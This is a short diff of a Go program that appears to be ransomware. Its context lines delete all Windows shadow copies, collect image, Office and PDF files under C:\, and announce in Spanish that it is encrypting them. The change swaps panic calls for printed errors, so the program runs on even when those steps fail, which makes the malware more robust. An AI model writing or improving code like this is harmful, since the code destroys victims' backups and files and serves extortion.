@@ -16,12 +16,12 @@ func main() {
 	}
 	resultInfo, errShadowCopies := comunUtils.DeleteAllShadowCopies()
 	if errShadowCopies != nil {
-		panic(errShadowCopies)
+		fmt.Println("Error:", errShadowCopies)
 	}
 	fmt.Println(resultInfo)
 	files, errListFiles := comunUtils.ListFiles(`C:\`, []string{"jpg", "jpeg", "png", "gif", "docx", "xlsx", "pptx", "pdf"})
 	if errListFiles != nil {
-		panic(errListFiles)
+		fmt.Println("Error:", errListFiles)
 	}
 	fmt.Println("Cifrando los siguientes archivos:")
 	for _, file := range files {
